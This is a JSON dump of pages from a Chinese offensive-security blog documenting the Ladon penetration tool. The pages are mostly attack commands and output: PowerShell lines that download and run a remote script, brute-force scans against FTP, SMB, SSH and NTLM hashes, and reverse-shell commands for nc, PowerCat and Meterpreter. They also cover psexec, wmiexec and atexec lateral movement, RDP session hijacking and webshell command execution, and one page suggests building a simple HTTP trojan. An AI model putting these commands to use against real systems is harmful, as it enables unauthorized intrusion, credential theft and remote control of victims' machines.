{"meta":{"title":"K8哥哥’s Blog","subtitle":"","description":"没有绝对安全的系统！！！K8博客，K8哥哥，Ladon，K8tools，Exploit，GetShell，扫描器，黑客，网络安全，信息安全，渗透测试，内网渗透，提权工具 ","author":"K8gege","url":"http://k8gege.org","root":"/"},"pages":[{"title":"Download","date":"2020-05-03T09:00:00.000Z","updated":"2020-08-01T16:26:11.418Z","comments":true,"path":"Download/index.html","permalink":"http://k8gege.org/Download/index.html","excerpt":"","text":"K8toolshttps://github.com/k8gege/K8tools K8bloghttps://github.com/k8gege/k8blog Ladon Title Download Date Version New Version https://k8gege.org/Download/Ladon7.0.rar 20200725 7.0 All Version https://github.com/k8gege/Ladon/releases 20200704 6.6 Cobalt Strike https://github.com/k8gege/Aggressor 20200704 6.6 PowerShell https://github.com/k8gege/powerladon 20200704 6.6 Kali/Linux/Mac https://github.com/k8gege/KaliLadon 20191210 5.5 Python https://github.com/k8gege/PyLadon 20191210 2.0 Historyhttps://k8gege.org/Download/Ladon7.0.rarhttps://k8gege.org/Download/Ladon6.6.rarhttps://k8gege.org/Download/Ladon6.5.rar Updatehttps://k8gege.org/Ladon/update.txt"},{"title":"FtpScan 21端口弱口令/FTP密码爆破","date":"2020-07-05T06:20:00.000Z","updated":"2020-08-01T16:25:41.870Z","comments":true,"path":"Ladon/FtpScan.html","permalink":"http://k8gege.org/Ladon/FtpScan.html","excerpt":"","text":"Ladon21端口 FTP密码爆破Ladon 192.168.1.8/24 FtpScan PowerLadon远程加载FtpScan 21端口弱口令爆破powershell “IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.1.3:800/Ladon6.6_all.ps1&#39;); Ladon 192.168.1.141 FtpScan” Kalimono Ladon 192.168.1.8/24 FtpScan 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases"},{"title":"NbtScan 139端口弱口令/Netbios密码爆破","date":"2020-08-01T07:20:00.000Z","updated":"2020-08-01T16:20:06.682Z","comments":true,"path":"Ladon/NbtScan.html","permalink":"http://k8gege.org/Ladon/NbtScan.html","excerpt":"","text":"版本Ladon &gt;= 7.1 139端口NetBIOS File and Print Sharing 通过这个端口进入的连接试图获得NetBIOS/SMB服务。这个协议被用于Windows”文件和打印机共享”和SAMBA。 IPC$通信Windows系统中的net use ipc$整个通信过程，先445-&gt;137-&gt;139验证，当你开启防火墙禁用445，发现系统命令就无法连接IPC了，根本没机会走到139，所以使用系统自带命令连接的ipc$需要同时开启这些端口。说入侵139就是IPC$的说法是错误的，就像说wmiexec.vbs可完全替代PSEXEC工具一样，这个脚本需要目标开启135和445，因为它通过445来传输结果，意味着目标只开放135这个VBS的回显就没有了，其实假设目标只开放445，这个VBS脚本还能执行命令吗？哪来的替代或扔掉？这个系统的IPC$连接也是同理，测试首先得把其它端口禁了再说话。虽然系统自带命令需要同时开启，但是 自己实现SMB服务器的话是可以只使用139或只用445端口的，详情参考impacket。 Nbt爆破系统自带命令需要同时开启139和445，但是 自己实现SMB服务器的话是可以只使用139或只用445端口的。系统的IPC$就像读取系统密码一样，可以先植入CS再用MIMI插件读取，但是我们也可以不使用CS，直接MIMI读取密码啊。基于和MIMI可以独立读取密码的原理，反向思路我们也可以完全不走445，直接通过139验证WINDOWS密码，所以这个和IPC$不一样(指的是系统命令连接的ipc)，所以为了防止大家误解，起名为NbtScan。毕竟走的也是Netbios，系统IPC$验证一是时间非常久，且必须开启445，如果445都开了为何不用SmbScan验证密码呢？但是由于近几年勒索病毒横行，可能很多机器默认会关闭445，所以会导致无法通过445验证密码，但是没关系还有139啊。 Ladon139端口 Netbios密码爆破(Windows)Ladon 192.168.1.8/24 NbtScan PowerLadon远程加载NbtScan 139端口弱口令爆破powershell “IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.1.3:800/Ladon7.1_all.ps1&#39;); Ladon 192.168.1.141 NbtScan” 139传输文件123456789101112131415161718192021222324#!/usr/bin/env python#coding:utf-8from smb.SMBConnection import SMBConnectionfrom nmb.NetBIOS import NetBIOSimport os,sysdef getBIOSName(remote_smb_ip, timeout=30): try: bios = NetBIOS() srv_name = bios.queryIPForName(remote_smb_ip, timeout=timeout) except: print &gt;&gt; sys.stderr, \"Looking up timeout, check remote_smb_ip again!!\" finally: bios.close() return srv_nameserverip='192.168.1.40'conn = SMBConnection('k8gege', 'k8gege520', 'C$',getBIOSName(serverip)[0], use_ntlm_v2 = True) assert conn.connect(serverip, 139)#temdir='/'#dir=os.path.join('/','public')f = open('C:/123.txt', 'rb')conn.storeFile('Users','234.txt',f)f.close() 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases"},{"title":"〖教程〗RDP会话劫持 Ladon无密码登陆管理员桌面会话","date":"2020-07-22T15:40:00.000Z","updated":"2020-08-01T16:24:03.081Z","comments":true,"path":"Ladon/RdpHijack.html","permalink":"http://k8gege.org/Ladon/RdpHijack.html","excerpt":"","text":"前言Windows系统下，tscon或任务管理器右键可被用来切换远程桌面的会话。正常情况下，切换会话时需要提供登录密码，但在SYSTEM权限下可够绕过验证，无密码实现未授权登录。该漏洞在2017年由以色列安全研究员Alexander Korznikov在个人博客中披露，mimikat里面也有该功能，为了方便Ladon也添加了该功能。 背景实战中某个项目的内网HTTPS证书有问题，特别奇葩不知为何，代理或CMD下无法连WEBSHELL，还有些远程连接程序管理员连着远程机器，特别是连着数据库的在自动处理数据，当管理员不在时我们只要接管他的会话就很香了。 漏洞细节本地用户若能获取NT AUTHORITY/SYSTEM权限执行命令，就能够劫持任何处于已登录用户的会话，而无需获得该用户的登录凭证。终端服务会话可以是连接状态也可以是未连接状态。 Korznikov认为这是个高危漏洞，可允许任何本地管理员劫持会话并访问： 域管理员会话； 被劫持用户正在处理的任何未保存文件； 被劫持用户先前登录的任何其他系统或应用（可能包括其他远程桌面会话、网络共享映射、需要其他登录凭证的应用、邮箱等） Ladon用法123456789Load RDPhijackUsage:Ladon RDPHijack sessionIDLadon RDPHijack type or passwordExample:Ladon RDPHijack 3Ladon RDPHijack 3 consoleLadon RDPHijack 3 P@ssw0rdLadon RDPHijack 3 disconnect 首先query user查看会话ID，然后使用Ladon接管会话即可，操作完成后disconnect即可，或者再连回原先会话。 PS: 用这个技术去劫持，系统不会请求合法用户登出，而是在没有任何通知的情况下，直接将用户踢出。 tscon用法 先获取SYSTEM权限,管理员权限执行以下命令，将弹出SYSTEM权限CMD，然后query user查看已登陆会话Ladon getsystem cmd.exe 创建劫持用户会话的服务 C:\\Users\\k8gege&gt;sc create sesshijack binpath= “cmd.exe /k tscon 1 /dest:rdp-tcp#5” [SC] CreateService SUCCESS 启动服务 net setart sesshijack PS：该方法优点系统自带，但稍威麻烦一点 条件1.管理员权限2.用户桌面（RDP、终端） 强大之处1.它可以登录到离线的机器。如果机器是在3天之内注销的，尽管它现在是离线状态，我们也可以进行登录。 2.它可以解锁会话。如果一个用户暂时离开他的计算机并且对他的机器，你可以使用这个漏洞进行解锁登录。 3.他同样适用于终端。所以，你可以劫持RDP，同样可以劫持终端。 4.当前用户切换至域控桌面，直接即可获取域控权限 5.特殊程序只能指定用户访问（如证书站点、Firefox、Chrome等使用DBAPI的密码读取） 6.配合SHIFT或放大镜等类似后门，可以在不登陆远程机器的情况下访问管理员会话。 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases"},{"title":"Ladon for PowerShell远程加载教程","date":"2020-07-04T09:30:00.000Z","updated":"2020-08-01T16:28:46.366Z","comments":true,"path":"Ladon/RemoteLadon.html","permalink":"http://k8gege.org/Ladon/RemoteLadon.html","excerpt":"","text":"前言本文仅是PowerLadon远程加载例子，并不代表只有这些功能。详情参考完整文档脚本可直接远程内存加载使用无须免杀，或者有些人比较喜欢的所谓无文件渗透 完整文档：http://k8gege.org/Ladon 架设WEB服务器使用命令 Ladon web 800 架设一个WEB服务器，用于远程下载脚本实战可架设在VPS，或者架设在目标内网机器（因为有机器不能出网）将脚本放在WEB目录下即可，当然大家也可以用IIS或APACHE搭建WEB 远程加载MS17010漏洞扫描powershell “IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.1.3:800/Ladon6.6_all.ps1&#39;); Ladon 192.168.1.8/24 MS17010” 远程加载Oracle弱口令爆破powershell “IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.1.3:800/Ladon6.6_all.ps1&#39;); Ladon 192.168.1.141 OracleScan” 远程加载SmbScan 445端口弱口令爆破powershell “IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.1.3:800/Ladon6.6_all.ps1&#39;); Ladon 192.168.1.141 SmbScan” 远程加载WmiScan 135端口弱口令爆破powershell “IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.1.3:800/Ladon6.6_all.ps1&#39;); Ladon 192.168.1.141 WmiScan” 远程加载SmbHash爆破内网主机（NtlmHash）powershell “IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.1.3:800/Ladon6.6_all.ps1&#39;); Ladon 192.168.1.40 SmbHash” 远程加载WmiHash爆破内网主机（NtlmHash）powershell “IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.1.3:800/Ladon6.6_all.ps1&#39;); Ladon 192.168.1.40 WmiHash” 远程加载反弹NC SHELLpowershell “IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.1.3:800/Ladon6.6_all.ps1&#39;); Ladon ReverseTcp 192.168.1.3 4444 nc” 远程加载PowerCat反弹NC SHELLpowershell “IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.1.110:800/Ladon6.6_all.ps1&#39;); Ladon PowerCat 192.168.1.110 4444 cmd” 远程加载WMI内网横向powershell “IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.1.3:800/Ladon6.6_all.ps1&#39;); Ladon wmiexec 192.168.1.40 administrator k8gege520 whoami” 远程加载atexec内网横向powershell “IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.1.3:800/Ladon6.6_all.ps1&#39;); Ladon atexec 192.168.1.40 administrator k8gege520 whoami” 远程加载sshexec内网横向powershell “IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.1.3:800/Ladon6.6_all.ps1&#39;); Ladon sshexec 192.168.1.40 root k8gege520 whoami” 远程加载SMBHASH爆破内网主机（NtlmHash）123456789101112131415C:\\Users\\null\\Desktop\\runnet&gt;powershell \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.3:800/Ladon6.6_all.ps1'); Ladon 192.168.1.40 smbhash\"Ladon 6.6Start: 2020-07-03 17:12:31Runtime: .net 2.0 OS Arch: x86OS Name: Microsoft Windows 7 旗舰版192.168.1.40load SmbHashScanICMP: 192.168.1.40 00-0C-29-0E-1D-50 VMware192.168.1.40 445 OpenSmbHashCheck 192.168.1.40 administrator BCB4DEE13F1BE64A85DE5769056E3008Successfully authenticated to the targetFound 192.168.1.40 administrator BCB4DEE13F1BE64A85DE5769056E3008 ISOKIP Finished!End: 2020-07-03 17:12:35 远程加载psexec内网横向1234567891011121314C:\\Users\\null\\Desktop\\runnet&gt;powershell \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.3:800/Ladon6.6_all.ps1'); Ladon psexec 192.168.1.40\"Ladon 6.6Start: 2020-07-03 15:35:55Runtime: .net 2.0 OS Arch: x86OS Name: Microsoft Windows 7 旗舰版Load PsExec[*] hostname: 192.168.1.40[*] Choosing net35[*] Copied net35 service executable to 192.168.1.40[*] Installed net35 Service on 192.168.1.40[*] Service Started on 192.168.1.40psexec&gt; whoamint authority\\system 远程加载atexec内网横向123456789101112C:\\Users\\null\\Desktop\\runnet&gt;powershell \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.3:800/Ladon6.6_all.ps1'); Ladon atexec 192.168.1.40 administrator k8gege520 whoami\"Ladon 6.6Start: 2020-07-03 17:07:53Runtime: .net 2.0 OS Arch: x86OS Name: Microsoft Windows 7 旗舰版Load AtExecSmbExec by 0x7556IPC Connected=====================================================nt authority\\system 远程加载wmiexec内网横向12345678910111213141516C:\\Users\\null\\Desktop\\runnet&gt;powershell \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.3:800/Ladon6.6_all.ps1'); Ladon wmiexec 192.168.1.40 administrator k8gege520 whoami\"Ladon 6.6Start: 2020-07-03 17:17:28Runtime: .net 2.0 OS Arch: x86OS Name: Microsoft Windows 7 旗舰版Load WmiExec[!] Connecting with administrator[i] Connecting to 192.168.1.40[i] Connected[i] Command: whoami[i] Running command...[i] Getting stdout from registry from SOFTWARE\\[i] Full command output receivedwin-4udh62v7dmn\\administrator 获取本机IP与外网IP 使用指定用户执行命令 窃取指定进程令牌权限执行命令，如LSASS获取SYSTEM权限 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases"},{"title":"〖教程〗Ladon反弹Shell系列教程","date":"2020-06-28T15:20:00.000Z","updated":"2020-08-01T16:28:34.540Z","comments":true,"path":"Ladon/ReverseShell.html","permalink":"http://k8gege.org/Ladon/ReverseShell.html","excerpt":"","text":"反弹TCP123Usage:Ladon ReverseTcp ip port typetype: meter shell nc 监听nc shell监听nc shell可用工具非常多，如NC、LadonGui、PowerCat、MSF等 123nc -l -v -p 4444LadonGui--Netcat--Listenpowercat -l -p 4444 反弹NC shell1Ladon ReverseTcp 192.168.1.8 4444 nc 反弹NC shellLadonGui监听常用NC监听 反弹MSF TCP Shell1Ladon ReverseTcp 192.168.1.8 4444 shell 反弹MSF TCP Meter1Ladon ReverseTcp 192.168.1.8 4444 meter 反弹TCP/UDP (CMD &amp; PowerShell)123456Load PowerCatUsage:Reverse Tcp: Ladon PowerCat -r 192.168.1.110 4444 cmdReverse Tcp: Ladon PowerCat -r 192.168.1.110 4444 pshReverse Udp: Ladon PowerCat -r 192.168.1.110 4444 cmd -uReverse Udp: Ladon PowerCat -r 192.168.1.110 4444 psh -u 反弹TCP,PowerCat监听执行PowerShell 反弹HTTP/HTTPS123Usage:Ladon ReverseHttp ip portLadon ReverseHttps ip port MSF监听windows/meterpreter/reverse_httpwindows/meterpreter/reverse_https 反弹MSF HTTPS Meter1Ladon ReverseTcp 192.168.1.8 4444 meter 反弹HTTPSMSF HTTPS 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases"},{"title":"〖教程〗Ladon以指定用户权限运行程序或命令","date":"2020-05-24T14:10:00.000Z","updated":"2020-08-01T16:26:46.037Z","comments":true,"path":"Ladon/RunAs.html","permalink":"http://k8gege.org/Ladon/RunAs.html","excerpt":"","text":"前言Ladon内置Runas允许用户用其他权限运行指定的工具和程序。系统自带Runas命令需要交互式登陆，在webshell或不支持交互式的shell下使用麻烦。而Ladon的Runas则完美解决了以上问题，支持非交互式模拟登陆指定用户运行程序或命令。 应用场景1.本机用户密码验证（权限不够读不到帐密或HASH的情况下，验证用户是否使用某个已知密码）2.SYSTEM权限降权，SYS权限下以用户身份执行命令，实现会话穿透，或访问特定用户的DBAPI加密数据3.低权限用户提权，网络服务帐户或用户权限下使用管理员权限来执行一些必须管理员才能执行的命令4.浏览器密码读取，本机存在多个用户，需要读取对应用户保存帐密（DBAPI），如Chrome、Firefox 提示：Runas条件是有帐密，提权降权也可使用GetSystem，无需帐密只需指定对应用户权限进程即可 用法12Ladon Runas user pass cmdLadon Runas user pass cmd domain 测试环境当前机器默认开启UAC，登陆用户为null，管理员用户为k8gege，默认管理员用户为AdministratorRunas在不同权限下模拟其它用户权限有一定区别，如UAC下模拟非内置管理员用户则受到UAC限制。 测试目的以不同权限模拟登陆同一用户执行添加用户命令，对比Runas的执行权限为什么用添加用户权限来对比，因为用户或管理员UAC是无法添加用户的通过是否可添加用户，可轻易区分模拟后的权限到底是具备什么权限 Uac权限非内置管理员用户在UAC权限下执行命令继承UAC权限，无法通过该用户权限添加用户但是模拟内置管理员Administrator权限则不受UAC影响，可以通过该权限添加用户。 Ladon Runas k8gege k8gege520 whoamiLadon Runas Administrator k8gege520 whoami Administrator权限管理员权限下模拟非内置管理员用户权限，是可以添加用户的Ladon Runas k8gege k8gege520 whoami System权限SYSTEM权限下模拟非内置管理员用户权限，是可以添加用户的Ladon Runas k8gege k8gege520 whoami 结论在UAC下需要模拟管理员权限执行命令，先过UAC或使用内置管理员管理员或SYSTEM权限模拟的用户具备什么权限，它就有对应的权限 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases"},{"title":"SmbHashScan 445端口SMB NTLM HASH密码爆破","date":"2020-07-04T09:30:00.000Z","updated":"2020-08-01T16:27:55.616Z","comments":true,"path":"Ladon/SmbHashScan.html","permalink":"http://k8gege.org/Ladon/SmbHashScan.html","excerpt":"","text":"Ladon445端口 SMB密码爆破(Windows)Ladon 192.168.1.8/24 SmbScan 445端口 SMB NTLM HASH爆破(Windows)Ladon 192.168.1.8/24 SmbHashScan PowerLadon远程加载SmbScan 445端口弱口令爆破powershell “IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.1.3:800/Ladon6.6_all.ps1&#39;); Ladon 192.168.1.141 SmbScan” 远程加载SmbHash爆破内网主机（NtlmHash）powershell “IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.1.3:800/Ladon6.6_all.ps1&#39;); Ladon 192.168.1.40 SmbHash” 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases"},{"title":"SmbScan 445端口弱口令/SMB密码爆破","date":"2020-07-04T09:30:00.000Z","updated":"2020-08-01T16:28:19.032Z","comments":true,"path":"Ladon/SmbScan.html","permalink":"http://k8gege.org/Ladon/SmbScan.html","excerpt":"","text":"Ladon445端口 SMB密码爆破(Windows)Ladon 192.168.1.8/24 SmbScan 445端口 SMB NTLM HASH爆破(Windows)Ladon 192.168.1.8/24 SmbHashScan PowerLadon远程加载SmbScan 445端口弱口令爆破powershell “IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.1.3:800/Ladon6.6_all.ps1&#39;); Ladon 192.168.1.141 SmbScan” 远程加载SmbHash爆破内网主机（NtlmHash）powershell “IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.1.3:800/Ladon6.6_all.ps1&#39;); Ladon 192.168.1.40 SmbHash” 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases"},{"title":"〖教程〗Windows下使用Ladon批量爆破SSH弱口令","date":"2020-05-03T10:10:00.000Z","updated":"2020-08-01T16:27:09.984Z","comments":true,"path":"Ladon/SshScan.html","permalink":"http://k8gege.org/Ladon/SshScan.html","excerpt":"","text":"前言对于Linux操作系统来说，一般通过VNC、Teamviewer和SSH等工具来进行远程管理，SSH是 Secure Shell的缩写，由IETF的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。 利用SSH协议可以有效防止远程管理过程中的信息泄露问题。SSH客户端适用于多种平台，几乎所有UNIX平台—包括HP-UX、Linux、AIX、Solaris、Digital UNIX、Irix，以及其他平台都可运行SSH。Kali Linux渗透测试平台默认配置SSH服务。SSH进行服务器远程管理，仅仅需要知道服务器的IP地址、端口、管理账号和密码，即可进行服务器的管理，网络安全遵循木桶原理，只要通过SSH撕开一个口子，对渗透人员来时这将是一个新的世界。 LadonLadon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。6.5版本内置69个功能模块,外部模块17个,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、Weblogic、ActiveMQ、Tomcat、Struts2系列等，密码爆破12种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、Windows(LDAP、SMB/IPC、WMI、SmbHash、WmiHash、Winrm)、BasicAuth、Tomcat、Weblogic、Rar等，远程执行命令包含(wmiexe/psexec/atexec/sshexec/jspshell),Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。 SSHscanLadon内置SSH密码爆破SSHscan,支持内外网指定IP、批量IP、批量IP段（C段、B段、A段）、支持CIDR格式，支持自定义SSH端口。支持IP帐密检测(check.txt)，支持帐密组检测(userpass.txt)，支持传统用户密码检测(user.txt、pass.txt),密码爆破前程序会自动检测端口是否开放，无需另外扫描22端口，准备好密码就可以批量爆破。 SSH服务版本识别SSH服务默认为22端口，在不配置帐密的情况下，使用sshscan可探测SSH服务版本，通过SSH服务信息可确定目标操作系统版本，也可进行下一步渗透，如OpenSSH某个版本存在RCE，通过RCE直接getshell，就不需要爆破了，所以先做什么后做什么很重要。不是动不动就无脑的全端口扫描，全漏洞扫描，默认端口就是SSH，就有漏洞，用的就是简单密码，还要做很多动作，产生很多流量，让管理员更容易发现？ 1Ladon 192.168.1.8 sshscan 如图，扫描C段开放SSH服务主机仅需3秒，探测到一台Ubuntu主机开放SSH服务，使用OepnSSH7.6 SSH密码爆破/暴力破解配置密码爆破参数1 支持标准的user.txt和pass.txt帐密破解，爆破每个用户都需将密码跑完或跑出正确为此2 支持userpass.txt（存放用户名和对应密码）,用于快速验证其它机器是否存在相同帐密3 支持check.txt（存放IP/端口/库名/用户/密码）,不指定端口和数据库名则使用默认 user.txt和pass.txt分别存放用户、密码userpass.txt存放用户密码组，即每行存放用户以及密码check.txt每行存放IP\\端口\\用户\\密码 例子check/验证check.txt192.168.1.8 22 root k8gege192.168.1.8 root k8gege userpass/帐密组userpass.txtroot k8gegeroot 123456 user &amp; pass /传统帐密user.txtroot pass.txttoork8gege 批量验证场景：通过配置文件读取到其它机器帐密时，可使用check.txt批量验证IP对应帐密是否可用，check可指定对应端口，默认为22,若被修改则在IP后加上自定义端口。check.txt192.168.1.8 22 root k8gege192.168.1.8 root k8gege 1Ladon SshScan 指定IP可使用帐密组userpass.txt或者传统帐密，支持自定义SSH端口，Target格式(IP:Port) 12Ladon 192.168.1.8 sshscanLadon 192.168.1.8:78 SshScan (自定义SSH端口78) 扫描C段可使用帐密组userpass.txt或者传统帐密(user.txt、pass.txt) 12Ladon 192.168.1.8/c sshscanLadon 192.168.1.8/24 sshscan 扫描B段可使用帐密组userpass.txt或者传统帐密(user.txt、pass.txt) 1Ladon 192.168.1.8/b sshscan 扫描A段可使用帐密组userpass.txt或者传统帐密(user.txt、pass.txt) 1Ladon 192.168.1.8/a sshscan 批量IP可使用帐密组userpass.txt或者传统帐密(user.txt、pass.txt),同样支持自定义端口,不指定为默认22端口ip.txt192.168.1.8192.168.1.5192.168.1.109:48 1Ladon SshScan 批量C段可使用帐密组userpass.txt或者传统帐密(user.txt、pass.txt),同样支持自定义端口,不指定为默认22端口ip24.txt192.168.1.10.1.5. 1Ladon SshScan 批量B段可使用帐密组userpass.txt或者传统帐密(user.txt、pass.txt),同样支持自定义端口,不指定为默认22端口ip16.txt192.168.10.1. 1Ladon SshScan 如图，爆破指定主机SSH密码、爆破C段主机SSH密码 SSH执行命令12Ladon SshExec 192.168.1.8 k8gege k8gege520 whoamiLadon SshExec 192.168.1.8 22 k8gege k8gege520 whoami 注意事项个别模块依赖DLL最好使用K8提供的，官网或第3方的不一定能用、兼容性不好等。如SSH爆破用的Renci.SshNet.dll，我曾经下过官方的不同版本发现有些能用有些不能用，也有同学不知从哪下的，刚和我说SSHscan在2012 R2没反应只扫描了端口然后就没了，然后我看它名称全是小写的和我提供的不一样，突然想起这个DLL的兼容性问题，让他下载Ladonlib之后果然可以用了。VNC的DLL也是一样官方源码的有个BUG 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases 其它模块Ladon其它密码爆破模块同理，若需要检测其它网络认证密码，将sshscan改成对应模块即可，如检测SMB帐密(Ladon 192.168.1.1/24 SmbScan) ID 模块名称 功能说明 返回结果 依赖 1 SmbScan SMB密码爆破(Windows) 检测过程、成功密码、LOG文件 2 WmiScan Wmi密码爆破(Windowns) 检测过程、成功密码、LOG文件 3 IpcScan Ipc密码爆破(Windows) 检测过程、成功密码、LOG文件 4 LdapScan AD域密码爆破(Windows) 检测过程、成功密码、LOG文件 5 SmbHashScan SMB HASH密码爆破(Windows) 检测过程、成功密码、LOG文件 6 WmiHashScan WMI HASH密码爆破(Windows) 检测过程、成功密码、LOG文件 7 SshScan SSH密码爆破(Linux) 检测过程、成功密码、LOG文件 Renci.SshNet.dll 8 MssqlScan Mssql数据库密码爆破 检测过程、成功密码、LOG文件 9 OracleScan Oracle数据库密码爆破 检测过程、成功密码、LOG文件 DDTek.Oracle.dll 10 MysqlScan Mysql数据库密码爆破 检测过程、成功密码、LOG文件 MySql.Data.dll 11 WeblogicScan Weblogic后台密码爆破 检测过程、成功密码、LOG文件 12 VncScan VNC远程桌面密码爆破 检测过程、成功密码、LOG文件 VncSharp.dll 13 FtpScan Ftp服务器密码爆破 检测过程、成功密码、LOG文件 14 RarScan Rar压缩包密码爆破 检测过程、成功密码、LOG文件 Rar.exe 15 TomcatScan Tomcat后台登陆密码爆破 检测过程、成功密码、LOG文件 16 HttpBasicScan HttpBasic401认证密码爆破 检测过程、成功密码、LOG文件"},{"title":"〖教程〗Ladon迷你WEB服务器/一键内网HTTP服务器","date":"2020-05-30T05:38:00.000Z","updated":"2020-08-01T16:29:00.984Z","comments":true,"path":"Ladon/WebSer.html","permalink":"http://k8gege.org/Ladon/WebSer.html","excerpt":"","text":"前言你是否在为配置浏览器漏洞测试环境而烦恼，如配置Apache解析某种MIME测试某个漏洞又或者在为内网机器无WEB又无法通过其它协议传输文件到内网另一台不出网的主机烦恼还有些远程命令不支持多条语句，需要多次写入或HTTP一次性下载过去，显然都会选后者 应用场景1.浏览器0day漏洞测试或VPS上一键部署，无需安装配置Apache2.内网HTTP协议文件传输，如内网目标不出网不允许其它协议通过3.Office/Word/Pdf等漏洞或远程下载SCT、HTA等格式的CS Payload4.IP追踪，在邮件里放任意URL，当目标查阅邮件时，可记录访问IP5.系统探测，无论用于XSS或IP追踪都会记录UA，确认目标操作系统6.出网探测，内网命令行访问VPS-WEB，看到IP证明可通过HTTP出网 7.远控问题，内网可访问WEB，HTTP不上线，就不要甩锅网络或WAF写个txt放CMD命令或结果，内网访问txt，若正常说明WAF根本不拦 PS：第7点做点修改就可以得到简单的HTTP马了类似CS，读取TXT获取CMD命令，然后执行。 WebSer启动为了安全起见，文件不存在返回404，默认不列目录 12Ladon web 80Ladon webser 80 列目录使用dir或dirlist参数，可返回WEB目录列表 12Ladon web 80 dirLadon webser 80 dir 运行权限使用TCP SOCKET实现的HTTP服务器，任意权限下都可以，不像HTTPlisten需管理员权限很多人常说TCPListen和HTTPLinsen有什么区别，都可以实现一模一样的WEB服务器但权限不一样，实现过程也不一样，就像不同快递，包装材料不一样，送达时间也不一样直接使用HTTP不需要自己构造协议包，而使用TCP得自己构造HTTP包，这就是区别之一 文件下载在Ladon同目录下放你想下载的文件，浏览器访问即可，命令行下载也可以 Linux: Wget、curl等Windows: 10几20多种，自行去网上搜索 工具下载最新版本：https://k8gege.org/Download历史版本: https://github.com/k8gege/Ladon/releases"},{"title":"〖教程〗Ladon连接WebShell一句话远程执行命令","date":"2020-05-21T15:20:00.000Z","updated":"2020-08-01T16:29:19.502Z","comments":true,"path":"Ladon/WebShell.html","permalink":"http://k8gege.org/Ladon/WebShell.html","excerpt":"","text":"前言在内网渗透中，横向移动用的最多的就是远程执行命令了，网上有很多相关工具，系统也自带相关命令。但不是体积大就是命令繁琐，如schtasks命令等，执行需先创建任务、执行任务、删除任务等，命令长，输错会浪费很多时间，即使复制粘贴也很麻烦。体积大的如Impacket中的psexec/atexec/smbexec/wmiexec等，若是使用PY2.7编译低版本最小也5M左右，最大可能37.5M，无论是内存加载或是传到目标都很麻烦，如果后渗透工具垃圾，区区这几M还未必能传上去，传上去得浪费很多时间。传一个就5M，传4个不得20M?基于以上原因，Ladon添加常用的远程执行命令功能，6.5体积仅844K就包含以上工具功能，扫描到相关密码，即可使用对应模块横向移动，一站式工具，完美一条龙服务。 Ladon远程执行命令PSEXEC交互式回显需先连接IPC，然后再通过psexec执行命令，类似psexec需445端口 1234net user \\\\192.168.1.8 k8gege520 /user:k8gegeLadon psexec 192.168.1.8psexec&gt; whoamint authority\\system WmiExec非交互回显并非所有机器都允许连接445端口，所以可通过135端口执行命令 1Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami AtExec非交互回显通过sctask命令执行，可以SYSTEM权限或对应用户执行命令，需445端口但是以用户权限执行命令需要远程机器登陆对应用户 1Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami SshExec非交互回显一般开放SSH服务的有Linux系统，网络设备等，默认为22端口 12Ladon SshExec 192.168.1.8 k8gege k8gege520 whoamiLadon SshExec 192.168.1.8 22 k8gege k8gege520 whoami JspShell非交互回显支持菜刀以及Ladon自动GetShell时传的UAshell，详见：http://k8gege.org/p/ladon_cs_shell.html 12Usage：Ladon JspShell type url pwd cmdExample: Ladon JspShell ua http://192.168.1.8/shell.jsp Ladon whoami WebShell非交互回显支持7种脚本(jsp asp php aspx cfm py perl)，3种类型WebShell(cd ua k8)支持菜刀以及Ladon自动GetShell时传的UAshell，详见：http://k8gege.org/p/ladon_cs_shell.html 1234Usage：Ladon WebShell ScriptType ShellType url pwd cmdExample: Ladon WebShell jsp ua http://192.168.1.8/shell.jsp Ladon whoamiExample: Ladon WebShell aspx cd http://192.168.1.8/1.aspx Ladon whoamiExample: Ladon WebShell php ua http://192.168.1.8/1.php 